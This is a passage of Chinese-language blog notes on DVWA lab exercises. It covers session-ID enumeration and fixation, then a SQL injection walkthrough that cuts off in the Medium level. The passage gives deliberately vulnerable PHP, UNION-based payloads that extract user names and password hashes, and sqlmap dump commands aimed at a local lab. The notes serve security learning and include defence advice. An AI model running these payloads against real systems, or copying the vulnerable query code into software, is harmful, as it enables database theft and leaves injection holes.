<td>32字符</td>
</tr>
<tr>
<td>字符集</td>
<td>数字</td>
<td>数字</td>
<td>十六进制</td>
<td>字母数字</td>
</tr>
<tr>
<td>暴力破解</td>
<td>秒级</td>
<td>分钟级</td>
<td>小时级</td>
<td>不可行</td>
</tr>
<tr>
<td>安全标志</td>
<td>❌</td>
<td>❌</td>
<td>❌</td>
<td>✅（可配置）</td>
</tr>
<tr>
<td>攻击难度</td>
<td>极易</td>
<td>简单</td>
<td>中等</td>
<td>极难</td>
</tr>
</tbody></table>
<hr>
<h2 id="常用攻击技巧"><a href="#常用攻击技巧" class="headerlink" title="常用攻击技巧"></a>常用攻击技巧</h2><h3 id="Session劫持"><a href="#Session劫持" class="headerlink" title="Session劫持"></a>Session劫持</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 枚举Session ID</span></span><br><span class="line"><span class="keyword">for</span> session_id <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">    cookies = &#123;<span class="string">&#x27;dvwaSession&#x27;</span>: <span class="built_in">str</span>(session_id)&#125;</span><br><span class="line">    response = requests.get(url, cookies=cookies)</span><br><span class="line">    <span class="comment"># 检查响应</span></span><br></pre></td></tr></table></figure>

<h3 id="Session固定"><a href="#Session固定" class="headerlink" title="Session固定"></a>Session固定</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. 攻击者获取Session ID：ABC123</span><br><span class="line"><span class="number">2</span>. 发送链接给受害者：http:<span class="regexp">//</span>site.com/?session_id=ABC123</span><br><span class="line"><span class="number">3</span>. 受害者登录（使用ABC123）</span><br><span class="line"><span class="number">4</span>. 攻击者使用ABC123访问（现在是已登录状态）</span><br></pre></td></tr></table></figure>

<h3 id="时间窗口攻击"><a href="#时间窗口攻击" class="headerlink" title="时间窗口攻击"></a>时间窗口攻击</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 针对基于时间的Session</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">current = <span class="built_in">int</span>(time.time())</span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">300</span>, <span class="number">300</span>):</span><br><span class="line">    test_session = current + offset</span><br><span class="line">    <span class="comment"># 或 md5(test_session)</span></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>学习路径：</strong></p>
<ol>
<li><strong>Low难度</strong> - 理解递增Session的危险</li>
<li><strong>Medium难度</strong> - 学习时间窗口枚举</li>
<li><strong>High难度</strong> - 掌握预计算攻击</li>
<li><strong>Impossible难度</strong> - 理解强随机Session</li>
</ol>
<p><strong>攻击技巧：</strong></p>
<ul>
<li>观察Session ID模式</li>
<li>使用Python脚本自动化</li>
<li>多线程加速枚举</li>
<li>预计算常见哈希</li>
</ul>
<p><strong>防御重点：</strong></p>
<ul>
<li>使用PHP内置Session</li>
<li>配置安全选项（HttpOnly, Secure）</li>
<li>定期更新Session ID</li>
<li>绑定IP&#x2F;User-Agent（可选）</li>
<li>设置超时</li>
</ul>
<p><strong>道德准则：</strong></p>
<ul>
<li>只在授权环境测试</li>
<li>不窃取他人Session</li>
<li>学习是为了构建安全系统</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en,zh-CN,default">
    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/SQL_Injection_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="caixuya">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tia的学习笔记">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/11/20/SQL_Injection_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" class="post-title-link" itemprop="url">DVWA - SQL Injection (SQL注入) 攻防练习详解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:26:39" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>15 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
</ul>
<hr>
<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是SQL注入（SQL-Injection）？"><a href="#什么是SQL注入（SQL-Injection）？" class="headerlink" title="什么是SQL注入（SQL Injection）？"></a>什么是SQL注入（SQL Injection）？</h3><p>SQL注入是一种代码注入技术，攻击者通过在应用程序的输入字段中插入恶意SQL代码，操纵后台数据库执行非预期的查询。</p>
<p><strong>攻击原理：</strong><br>应用程序将用户输入直接拼接到SQL查询语句中，没有进行适当的过滤和验证。</p>
<p><strong>危害：</strong></p>
<ul>
<li>绕过登录验证</li>
<li>读取敏感数据（用户信息、密码）</li>
<li>修改数据库内容</li>
<li>删除数据</li>
<li>执行系统命令（高级）</li>
<li>完全控制数据库服务器</li>
</ul>
<p><strong>OWASP Top 10：</strong><br>SQL注入长期位居OWASP十大Web应用安全风险前列。</p>
<hr>
<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完全未过滤的用户ID查询，存在严重SQL注入漏洞。</p>
<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否提交了表单</span></span><br><span class="line"><span class="comment">// isset() - 检查变量是否存在且非NULL</span></span><br><span class="line"><span class="comment">// $_REQUEST - 包含$_GET、$_POST、$_COOKIE的超全局数组</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 危险操作：直接获取用户输入，无任何过滤 ★★★</span></span><br><span class="line">    <span class="comment">// 从请求中获取id参数</span></span><br><span class="line">    <span class="comment">// 例如：?id=1&amp;Submit=Submit</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心漏洞：直接拼接SQL语句 ★★★</span></span><br><span class="line">    <span class="comment">// 将用户输入直接插入SQL查询</span></span><br><span class="line">    <span class="comment">// 没有任何验证、过滤或转义！</span></span><br><span class="line">    <span class="comment">// $id的值完全由用户控制</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行SQL查询</span></span><br><span class="line">    <span class="comment">// mysql_query() - 执行MySQL查询（已废弃的函数）</span></span><br><span class="line">    <span class="comment">// or die() - 查询失败时终止并显示错误</span></span><br><span class="line">    <span class="comment">// mysql_error() - 返回MySQL错误信息（会泄露数据库结构！）</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取查询结果</span></span><br><span class="line">    <span class="comment">// mysql_fetch_assoc() - 将结果行作为关联数组返回</span></span><br><span class="line">    <span class="comment">// 例如：[&#x27;first_name&#x27; =&gt; &#x27;admin&#x27;, &#x27;last_name&#x27; =&gt; &#x27;admin&#x27;]</span></span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_assoc</span>( <span class="variable">$result</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查是否有结果</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$row</span> ) &#123;</span><br><span class="line">        <span class="comment">// 输出用户信息</span></span><br><span class="line">        <span class="comment">// &#123;$row[ &#x27;first_name&#x27; ]&#125; - 在双引号字符串中插入变量</span></span><br><span class="line">        <span class="comment">// &lt;br /&gt; - HTML换行标签</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;ID: &#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&lt;br /&gt;First name: &#x27;</span> . <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ] . <span class="string">&#x27;&lt;br /&gt;Surname: &#x27;</span> . <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 未找到用户</span></span><br><span class="line">        <span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭数据库连接</span></span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>核心问题：</strong></p>
<ol>
<li><strong>直接拼接SQL</strong> - 用户输入直接插入查询</li>
<li><strong>无输入验证</strong> - 不检查ID是否为数字</li>
<li><strong>无特殊字符过滤</strong> - 允许单引号、注释符等</li>
<li><strong>错误信息泄露</strong> - 显示MySQL错误（暴露数据库结构）</li>
<li><strong>使用废弃函数</strong> - mysql_query()已不再推荐</li>
</ol>
<p><strong>攻击向量：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 正常查询</span></span><br><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 注入攻击</span></span><br><span class="line"><span class="comment">-- 输入：1&#x27; OR &#x27;1&#x27;=&#x27;1</span></span><br><span class="line"><span class="keyword">SELECT</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">OR</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="comment">-- 结果：返回所有用户（因为 &#x27;1&#x27;=&#x27;1&#x27; 永远为真）</span></span><br></pre></td></tr></table></figure>

<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="步骤1：判断是否存在SQL注入"><a href="#步骤1：判断是否存在SQL注入" class="headerlink" title="步骤1：判断是否存在SQL注入"></a>步骤1：判断是否存在SQL注入</h4><p><strong>测试1：输入单引号</strong></p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="number">1</span><span class="comment">&#x27;</span></span><br><span class="line">完整SQL：<span class="keyword">SELECT</span> ... <span class="keyword">WHERE</span> user_id = <span class="comment">&#x27;1&#x27;&#x27;;</span></span><br><span class="line">结果：SQL语法错误</span><br><span class="line">错误信息：You have an <span class="keyword">error</span> <span class="keyword">in</span> your SQL syntax...</span><br></pre></td></tr></table></figure>

<p><strong>测试2：注释符测试</strong></p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="number">1</span>&#x27; <span class="comment">--</span></span><br><span class="line">完整SQL：<span class="keyword">SELECT</span> ... WHERE user_id = <span class="string">&#x27;1&#x27;</span> <span class="comment">-- &#x27;;</span></span><br><span class="line">结果：正常显示ID=<span class="number">1</span>的用户</span><br><span class="line">说明：<span class="comment">-- 注释掉了后面的单引号</span></span><br></pre></td></tr></table></figure>

<p><strong>测试3：逻辑测试</strong></p>
<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="number">1</span><span class="string">&#x27; OR &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">完整SQL：<span class="keyword">SELECT</span> <span class="params">...</span> <span class="keyword">WHERE</span> user_id = <span class="string">&#x27;1&#x27;</span> <span class="literal">OR</span> <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">结果：显示所有用户</span><br></pre></td></tr></table></figure>

<h4 id="步骤2：判断列数（UNION注入准备）"><a href="#步骤2：判断列数（UNION注入准备）" class="headerlink" title="步骤2：判断列数（UNION注入准备）"></a>步骤2：判断列数（UNION注入准备）</h4><p><strong>使用ORDER BY判断列数：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 输入：1&#x27; ORDER BY 1 --</span></span><br><span class="line"><span class="comment">-- 结果：正常（说明至少有1列）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 输入：1&#x27; ORDER BY 2 --</span></span><br><span class="line"><span class="comment">-- 结果：正常（说明至少有2列）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 输入：1&#x27; ORDER BY 3 --</span></span><br><span class="line"><span class="comment">-- 结果：错误（说明只有2列）</span></span><br><span class="line"><span class="comment">-- 结论：表有2列</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤3：使用UNION注入获取数据"><a href="#步骤3：使用UNION注入获取数据" class="headerlink" title="步骤3：使用UNION注入获取数据"></a>步骤3：使用UNION注入获取数据</h4><p><strong>基本UNION注入：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 输入：1&#x27; UNION SELECT NULL, NULL --</span></span><br><span class="line"><span class="comment">-- 测试UNION是否可用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 输入：1&#x27; UNION SELECT &#x27;test1&#x27;, &#x27;test2&#x27; --</span></span><br><span class="line"><span class="comment">-- 结果：显示 First name: test1, Surname: test2</span></span><br><span class="line"><span class="comment">-- 说明：可以注入任意数据</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤4：获取数据库信息"><a href="#步骤4：获取数据库信息" class="headerlink" title="步骤4：获取数据库信息"></a>步骤4：获取数据库信息</h4><p><strong>获取数据库版本：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 输入：1&#x27; UNION SELECT @@version, NULL --</span></span><br><span class="line"><span class="comment">-- 结果：显示MySQL版本号</span></span><br></pre></td></tr></table></figure>

<p><strong>获取当前数据库名：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 输入：1&#x27; UNION SELECT database(), NULL --</span></span><br><span class="line"><span class="comment">-- 结果：显示当前数据库名（dvwa）</span></span><br></pre></td></tr></table></figure>

<p><strong>获取当前用户：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 输入：1&#x27; UNION SELECT user(), NULL --</span></span><br><span class="line"><span class="comment">-- 结果：显示当前数据库用户</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤5：枚举数据库结构"><a href="#步骤5：枚举数据库结构" class="headerlink" title="步骤5：枚举数据库结构"></a>步骤5：枚举数据库结构</h4><p><strong>获取所有数据库名：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 输入：1&#x27; UNION SELECT schema_name, NULL FROM information_schema.schemata --</span></span><br><span class="line"><span class="comment">-- 结果：列出所有数据库</span></span><br></pre></td></tr></table></figure>

<p><strong>获取所有表名：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 输入：1&#x27; UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=&#x27;dvwa&#x27; --</span></span><br><span class="line"><span class="comment">-- 结果：列出dvwa数据库中的所有表</span></span><br><span class="line"><span class="comment">-- 例如：users, guestbook等</span></span><br></pre></td></tr></table></figure>

<p><strong>获取列名：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 输入：1&#x27; UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=&#x27;users&#x27; --</span></span><br><span class="line"><span class="comment">-- 结果：列出users表的所有列名</span></span><br><span class="line"><span class="comment">-- 例如：user_id, first_name, last_name, user, password等</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤6：获取敏感数据"><a href="#步骤6：获取敏感数据" class="headerlink" title="步骤6：获取敏感数据"></a>步骤6：获取敏感数据</h4><p><strong>获取用户名和密码：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 输入：1&#x27; UNION SELECT user, password FROM users --</span></span><br><span class="line"><span class="comment">-- 结果：显示所有用户名和密码哈希</span></span><br><span class="line"><span class="comment">-- 例如：</span></span><br><span class="line"><span class="comment">-- First name: admin</span></span><br><span class="line"><span class="comment">-- Surname: 5f4dcc3b5aa765d61d8327deb882cf99 (password的MD5)</span></span><br></pre></td></tr></table></figure>

<p><strong>一次性获取所有用户信息：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 输入：1&#x27; UNION SELECT CONCAT(user,&#x27;:&#x27;,password), NULL FROM users --</span></span><br><span class="line"><span class="comment">-- 结果：admin:5f4dcc3b5aa765d61d8327deb882cf99</span></span><br></pre></td></tr></table></figure>

<p><strong>GROUP_CONCAT获取所有数据：</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 输入：1&#x27; UNION SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password SEPARATOR &#x27;&lt;br&gt;&#x27;), NULL FROM users --</span></span><br><span class="line"><span class="comment">-- 结果：一次性显示所有用户和密码</span></span><br><span class="line"><span class="comment">-- admin:5f4dcc3b5aa765d61d8327deb882cf99&lt;br&gt;gordonb:e99a18c428cb38d5f260853678922e03...</span></span><br></pre></td></tr></table></figure>

<h4 id="步骤7：使用SQLMap自动化"><a href="#步骤7：使用SQLMap自动化" class="headerlink" title="步骤7：使用SQLMap自动化"></a>步骤7：使用SQLMap自动化</h4><p><strong>基本用法：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装sqlmap（Kali Linux自带）</span></span><br><span class="line">apt-get install sqlmap</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本注入测试</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">--cookie=<span class="string">&quot;security=low; PHPSESSID=你的session&quot;</span> \</span><br><span class="line">--batch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取所有数据库</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">--cookie=<span class="string">&quot;security=low; PHPSESSID=你的session&quot;</span> \</span><br><span class="line">--dbs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前数据库的表</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">--cookie=<span class="string">&quot;security=low; PHPSESSID=你的session&quot;</span> \</span><br><span class="line">-D dvwa --tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取users表的数据</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">--cookie=<span class="string">&quot;security=low; PHPSESSID=你的session&quot;</span> \</span><br><span class="line">-D dvwa -T <span class="built_in">users</span> --dump</span><br></pre></td></tr></table></figure>

<p><strong>参数说明：</strong></p>
<ul>
<li><code>-u</code> - 目标URL</li>
<li><code>--cookie</code> - 设置Cookie</li>
<li><code>--batch</code> - 使用默认选项（不询问）</li>
<li><code>--dbs</code> - 枚举所有数据库</li>
<li><code>-D</code> - 指定数据库</li>
<li><code>-T</code> - 指定表</li>
<li><code>--dump</code> - 导出数据</li>
</ul>
<h4 id="步骤8：使用Burp-Suite"><a href="#步骤8：使用Burp-Suite" class="headerlink" title="步骤8：使用Burp Suite"></a>步骤8：使用Burp Suite</h4><p><strong>步骤：</strong></p>
<ol>
<li>拦截请求</li>
<li>发送到Repeater</li>
<li>修改id参数为注入payload</li>
<li>观察响应</li>
</ol>
<p><strong>示例payload：</strong></p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; UNION <span class="keyword">SELECT</span> <span class="keyword">user</span>, <span class="keyword">password</span> <span class="keyword">FROM</span> users --</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>添加了mysqli和下拉菜单，但仍可注入。</p>
<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进1：使用POST而不是GET ★★★</span></span><br><span class="line">    <span class="comment">// $_POST - 从POST请求体获取数据</span></span><br><span class="line">    <span class="comment">// 相比GET更安全，不会出现在URL中</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进2：使用mysqli_real_escape_string() ★★★</span></span><br><span class="line">    <span class="comment">// mysqli_real_escape_string() - 转义SQL语句中的特殊字符</span></span><br><span class="line">    <span class="comment">// 转义字符：\x00, \n, \r, \, &#x27;, &quot;, \x1a</span></span><br><span class="line">    <span class="comment">// 作用：防止通过单引号闭合SQL语句</span></span><br><span class="line">    <span class="comment">// $GLOBALS[&quot;___mysqli_ston&quot;] - mysqli数据库连接对象</span></span><br><span class="line">    <span class="comment">// 原理：&#x27;转义为\&#x27;，使其无法闭合字符串</span></span><br><span class="line">    <span class="variable">$id</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) 